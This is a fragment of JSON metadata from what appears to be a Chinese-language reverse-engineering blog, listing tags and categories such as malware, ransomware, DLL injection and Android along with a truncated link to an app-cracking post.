安装APK，运行：","link":"/2024/02/22/crack-koudaizhentan-2/"}],"tags":[{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"AIDL","slug":"AIDL","link":"/tags/AIDL/"},{"name":"VMWare","slug":"VMWare","link":"/tags/VMWare/"},{"name":"HTML","slug":"HTML","link":"/tags/HTML/"},{"name":"iframe","slug":"iframe","link":"/tags/iframe/"},{"name":"病毒","slug":"病毒","link":"/tags/%E7%97%85%E6%AF%92/"},{"name":"勒索软件","slug":"勒索软件","link":"/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/"},{"name":"诱饵文件","slug":"诱饵文件","link":"/tags/%E8%AF%B1%E9%A5%B5%E6%96%87%E4%BB%B6/"},{"name":"逆向分析","slug":"逆向分析","link":"/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"},{"name":"结构体","slug":"结构体","link":"/tags/%E7%BB%93%E6%9E%84%E4%BD%93/"},{"name":"函数","slug":"函数","link":"/tags/%E5%87%BD%E6%95%B0/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"进程","slug":"进程","link":"/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"内核编程","slug":"内核编程","link":"/tags/%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B/"},{"name":"通知与回调","slug":"通知与回调","link":"/tags/%E9%80%9A%E7%9F%A5%E4%B8%8E%E5%9B%9E%E8%B0%83/"},{"name":"内存","slug":"内存","link":"/tags/%E5%86%85%E5%AD%98/"},{"name":"远程线程","slug":"远程线程","link":"/tags/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B/"},{"name":"DLL注入","slug":"DLL注入","link":"/tags/DLL%E6%B3%A8%E5%85%A5/"},{"name":"线程","slug":"线程","link":"/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"进程注入","slug":"进程注入","link":"/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"},{"name":"PE文件","slug":"PE文件","link":"/tags/PE%E6%96%87%E4%BB%B6/"},{"name":"重定位","slug":"重定位","link":"/tags/%E9%87%8D%E5%AE%9A%E4%BD%8D/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"}],"categories":[{"name":"Android","slug":"Android","link":"/categories/Android/"},{"name":"Web","slug":"Web","link":"/categories/Web/"},{"name":"Malware","slug":"Malware","link":"/categories/Malware/"},{"name":"Reverse","slug":"Reverse","link":"/categories/Reverse/"},{"name":"Windows","slug":"Windows","link":"/categories/Windows/"}]}